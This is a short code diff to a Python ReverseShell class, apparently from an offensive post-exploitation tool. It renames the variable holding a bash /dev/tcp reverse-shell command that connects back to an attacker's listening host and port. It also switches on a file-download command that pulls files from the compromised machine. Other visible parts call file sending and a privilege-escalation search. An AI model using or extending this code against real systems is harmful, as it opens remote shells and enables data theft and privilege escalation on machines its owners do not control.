@@ -11,9 +11,9 @@ class ReverseShell:
         self.lhost = lhost
         self.lport = lport
         self.rhost = rhost
-        self.simple_reverse_shell_bash = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=lhost, port=lport)
+        self.rshell_bash_dev_tcp = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=lhost, port=lport)
         self.cli = CLI()
-        self.cli.cli_print(self.simple_reverse_shell_bash)
+        self.cli.cli_print(self.rshell_bash_dev_tcp)
         self.listener = PortListener(lhost, lport)
         self.running = True
 
@@ -52,12 +52,10 @@ class ReverseShell:
             args = args.split(' ')
             self.send_file(args[0], args[1])
             return ''
-        # TODO
         elif command.lower() == 'd':
-            print('not implemented')
-        #    args = input('download file: <src> <dest> ')
-        #    args = args.split(' ')
-        #    self.receive_file(args[0], args[1])
+            args = input('download file: <src> <dest> ')
+            args = args.split(' ')
+            self.receive_file(args[0], args[1])
             return ''
         elif command.lower() == 'e':
             self.search_for_privesc()
